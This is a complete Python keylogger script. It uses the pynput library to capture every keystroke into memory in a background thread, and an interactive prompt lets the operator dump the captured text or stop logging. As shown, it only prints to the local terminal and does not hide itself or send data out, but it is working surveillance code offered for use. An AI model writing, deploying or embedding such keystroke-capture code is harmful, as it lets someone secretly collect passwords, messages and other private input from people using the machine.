from threading import Thread
import pynput.keyboard
from termcolor import cprint

keylogvar = ""
running = True
keyboard_Listener = None

def process_Key_Press(key):
    global keylogvar
    try:
        keylogvar += str(key.char)
    except AttributeError:
        if key == key.space:
            keylogvar += " "
        else:
            keylogvar += str(key)

def keyBoardLoggerFunc():
    global keyboard_Listener
    try:
        with pynput.keyboard.Listener(on_press=process_Key_Press) as listener:
            keyboard_Listener = listener
            listener.join()
    except Exception as ex:
        cprint("[-] Something went wrong", "red")
    finally:
        cprint("[-] Terminating keylogger thread ...", "yellow")

def Handler():
    global running
    while running:
        command = input("[+]> What do you want to do:").strip()
        if command == "dump log":
            cprint(keylogvar, "green")
        elif command == "quit":
            cprint("Terminating keylogger thread ...", "yellow")
            running = False
            if keyboard_Listener:
                keyboard_Listener.stop()

def main():
    try:
        cprint("[+] Starting keylogger thread ....")
        keylogthread = Thread(target=keyBoardLoggerFunc)
        keylogthread.start()
        cprint("[+] Started keylogger thread ....")
        Handler()
        keylogthread.join()
        cprint("[+] Keylogger thread terminated.", "yellow")
    except KeyboardInterrupt:
        cprint("[-] Operation Cancelled", "red")

if __name__ == "__main__":
    main()
